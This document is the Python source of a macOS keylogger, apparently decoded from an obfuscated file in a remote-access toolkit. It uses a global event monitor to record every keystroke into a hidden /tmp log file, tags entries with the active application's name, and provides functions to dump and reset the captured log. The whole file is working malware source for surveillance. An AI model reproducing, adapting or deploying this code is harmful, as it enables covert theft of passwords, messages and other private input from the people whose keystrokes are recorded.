#!/usr/bin/env python3
# Decoded from Configuration/st_osx_keylogger.py
# Original was obfuscated with exec(SEC(INFO(...)))


import re
import time
import datetime
import threading
from AppKit import NSApplication, NSApp, NSWorkspace
from Foundation import NSObject, NSLog
from Cocoa import NSEvent, NSKeyDownMask
from PyObjCTools import AppHelper

class keylogger():

    def __init__(self):
        self.log_file = '/tmp/.stkl.log'
        self.kl_status = False
        mask = NSKeyDownMask
        self.st_monitor = NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask,self.KeyStroke)
        self.active_window = ''

    def KeyStroke(self,event):
        if self.kl_status:
            try:
                self.check_active_win()
                self.key_count += 1
                keystroke = re.findall(' chars="(.)" ',str(event))[0]
                self.log_handle.write(keystroke)
                if self.key_count > 75:
                    self.log_handle.write('\n')
                    self.key_count = 0
                #self.log_handle.write(str(event))
            except Exception:
                pass

    def check_active_win(self):
        if NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName'] not in self.active_win:
            self.active_window = NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
            now = datetime.datetime.now()
            start_time=now.strftime("%Y-%m-%d %H:%M:%S")
            kl_summary = "\n\n[ {} ] - {}\n".format(start_time,self.active_window)
            self.log_handle.write(kl_summary)

    def start(self):
        self.log_handle = open(self.log_file,'a')
        self.kl_status = True
        self.key_count = 0
        now = datetime.datetime.now()
        start_time=now.strftime("%Y-%m-%d %H:%M:%S")
        kl_summary = "\n[ {} ] - Keylogger is now running".format(start_time)
        self.log_handle.write(kl_summary)

    def stop(self):
        self.kl_status = False
        now = datetime.datetime.now()
        end_time=now.strftime("%Y-%m-%d %H:%M:%S")
        kl_summary = "\n\n[ {} ] - Keylogger has been stopped\n".format(end_time)
        self.log_handle.write(kl_summary)
        self.log_handle.close()

    def get_status(self):
        return self.kl_status

    def dump_logs(self):
        with open(self.log_file,'rb') as s:
            resp = ''
            data = s.readlines()
            for line in data:
                if '\x7f' in line:
                    line = line.replace('\x7f','[BS]')
                resp += line
        return resp

    def get_dump(self):
        if self.get_status():
            self.kl_status = False
            self.log_handle.close()
            resp=self.dump_logs()
            self.log_handle = open(self.log_file,'w')
            self.kl_status = True
            self.active_window = ''
            self.key_count = 0
        else:
            resp=self.dump_logs()
        return str(resp)
